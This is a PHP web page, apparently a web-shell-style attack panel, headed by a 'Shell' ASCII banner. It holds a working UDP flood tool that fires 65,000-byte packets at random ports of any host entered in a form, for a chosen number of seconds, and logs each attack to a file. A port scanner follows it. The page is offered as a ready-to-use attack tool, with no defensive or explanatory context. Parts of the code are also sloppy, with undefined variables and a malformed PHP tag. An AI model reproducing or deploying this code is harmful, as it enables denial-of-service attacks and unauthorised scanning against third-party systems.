<html>
<body>
<center>
<font color="00FF00">
<pre>
__ _ _ _
/ ____| | | | |
(___ | |__ ___| | |
___ | '_ \ / _ \ | |
__ _) | | | | __/ | |
__/|_| |_|\___|_|_|
</pre>
<STYLE>
input{
background-color: #00FF00; font-size: 8pt; color: black; font-family:

Tahoma; border: 1

solid #66;
}
button{
background-color: #00FF00; font-size: 8pt; color: black; font-family:

Tahoma; border: 1

solid #66;
}
body {
background-color: black;
}
</style>
<?php
//UDP
if(isset($_GET['host'])&&is_numeric($_GET['time'])){
$packets = 0;
ignore_user_abort(TRUE);
set_time_limit(0);

$exec_time = $_GET['time'];

$time = time();
//print "Started: ".time('d-m-y h:i:s')."<br>";
$max_time = $time+$exec_time;

$host = $_GET['host'];

for($i=0;$i<65000;$i++){
$out .= 'X';
}
while(1){
$packets++;
if(time() > $max_time){
break;
}
$rand = rand(1,65000);
$fp = fsockopen('udp://'.$host, $rand, $errno,

$errstr, 5);
if($fp){
fwrite($fp, $out);
fclose($fp);
}
}
$fp = fopen('log.php', 'a');
date_default_timezone_set('EST');
fwrite($fp, "UDP flood at " .date("d/m/y h:i") . " + 1 Hour DST,

Completed with " .

$packets . " (" . round(($packets*65)/1024, 2) . " MB) packets

averaging " .

round($packets/$exec_time, 2) . " packets per second. On IP:

".$_GET['host']." , For "

.$_GET['time']. " Seconds \n");
fclose($fp);
echo "<br><b>UDP Flood</b><br>Completed with $packets (" .

round(($packets*65)/1024, 2) . " MB) packets averaging ".

round($packets/$exec_time, 2) .

" packets per second \n";
echo '<br><br>
<form action="'.$surl.'" method=GET>
<input type="hidden" name="act" value="phptools">
Host: <br><input type=text name=host><br>
Length (seconds): <br><input type=text name=time><br>
<input type=submit value=Go></form>';
}else{ echo '<br><b>UDP Flood</b><br>
<form action=? method=GET>
<input type="hidden" name="act"

value="phptools">
Host: <br><input type=text name=host

value=><br>
Length (seconds): <br><input type=text

name=time value=><br><br>
<input type=submit value=Go></form>';
}

//port scanner
echo '<br><br><br><b>Port Scanner</b><br>';

if(isset($_GET['host']) && is_numeric($_GET['end']) &&

is_numeric($_GET['start'])){
for($i = $start; $i<=$end; $i++){
$fp = @fsockopen($host, $i, $errno, $errstr, 3);
if($fp){
echo 'Port '.$i.' is <font

color=green>open</font><br>';
}
flush();
}
$fp = fopen('log.php', 'a');
date_default_timezone_set('EST');
fwrite($fp, "Port Scan at " .date("d/m/y h:i:s") . " + 1 Hour DST, IP

Scanned: "

.$_GET['host']. " \n");
fclose($fp);
}else{
?>
<form action="?" method="get">
<input type="hidden" name="act" value="phptools">
Host:<br />
<input type="text" name="host" value=""/><br />
Port start:<br />
<input type="text" name="start" value=""/><br />
Port end:<br />
<input type="text" name="end" value=""/><br /><br />
<input type="submit" value="Scan Ports" />
</form>
<?php>
}
?>
<h5><u>IPK</u></h5>
</center>
</body>
</html>